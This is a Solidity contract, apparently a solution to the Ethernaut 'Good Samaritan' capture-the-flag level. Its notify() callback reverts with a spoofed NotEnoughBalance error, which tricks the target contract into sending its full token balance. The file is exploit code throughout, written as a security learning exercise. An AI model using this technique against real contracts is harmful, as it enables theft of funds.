// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import {GoodSamaritan} from "../src/GoodSamaritan.sol";

contract GoodSamaritanAttack {
    GoodSamaritan public goodSamaritanContract;

    error NotEnoughBalance();

    constructor(address _goodSamaritanContractAddress) {
        goodSamaritanContract = GoodSamaritan(_goodSamaritanContractAddress);
    }

    function attack() external {
        goodSamaritanContract.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
